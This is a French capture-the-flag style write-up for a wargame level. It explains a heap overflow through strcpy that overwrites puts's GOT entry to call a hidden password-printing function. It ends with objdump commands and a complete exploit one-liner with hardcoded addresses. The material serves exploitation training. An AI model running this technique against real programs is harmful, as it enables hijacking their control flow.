# Level7 — Heap Overflow + GOT Overwrite

## Vulnérabilité
Heap overflow via `strcpy` sans vérification de taille.
Le but : écraser une entrée de la GOT pour rediriger l'exécution vers `m()`, qui affiche le password.

---

## Structure mémoire (heap)

Le `main` alloue 4 chunks de 8 octets, organisés en deux paires :

```
A = [  1  |  &B  ]   ← conteneur, pointe vers B
B = [   vide     ]   ← buffer qui reçoit argv[1]

C = [  2  |  &D  ]   ← conteneur, pointe vers D
D = [   vide     ]   ← buffer qui reçoit argv[2]
```

A et C ne servent qu'à **pointer** vers leur buffer respectif.

---

## Les deux strcpy

```c
strcpy(A[1], argv[1])   →   A[1] = &B   →   écrit argv[1] dans B
strcpy(C[1], argv[2])   →   C[1] = &D   →   écrit argv[2] dans D
```

---

## La fonction `m` (jamais appelée)

```c
void m() {
    printf("%s - %d\n", c, time(0));  // c = variable globale avec le password
}
```

`m` affiche le password mais n'est jamais appelée dans `main`.
Il faut l'appeler de force via la GOT.

---

## Mécanisme d'exploitation

### Étape 1 — Overflow de B pour écraser C[1]

Sur le heap, B et C sont adjacents. Distance de B[0] jusqu'à C[1] :

```
B data   :  8 octets
C header :  8 octets  (metadata malloc)
C[0]     :  4 octets  (le "2")
─────────────────────
C[1]     :  ← on veut écrire ici  →  20 octets de padding
```

argv[1] = `"A" * 20 + adresse_GOT_puts`

```
B = [ AAAAAAAAAAAAAAAAAAAA ]  déborde →
C = [  2  |  0x08049928   ]  ← C[1] écrasé avec &GOT[puts]
```

Avant : `C[1] = &D`
Après : `C[1] = 0x08049928` (GOT[puts])

### Étape 2 — Écrire l'adresse de `m` dans la GOT via argv[2]

Maintenant `C[1] = 0x08049928`.

Le 2ème strcpy fait :
```c
strcpy(C[1], argv[2])
= strcpy(0x08049928, adresse_de_m)
```

- `C[1]` = la **destination** = GOT[puts]
- `argv[2]` = le **contenu** = adresse de `m`

→ on écrase GOT[puts] avec l'adresse de `m`

### Étape 3 — `puts("~~")` appelle `m`

```
puts("~~")
    ↓
regarde GOT[puts]  →  adresse de m  (écrasée)
    ↓
m() s'exécute  →  affiche le password
```

---

## Commandes

```bash
# Trouver l'adresse GOT de puts
objdump -R ./level7
# → 08049928 R_386_JUMP_SLOT  puts

# Trouver l'adresse de m
objdump -d ./level7 | grep "<m>"
# → 080484f4 <m>

# Exploit
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```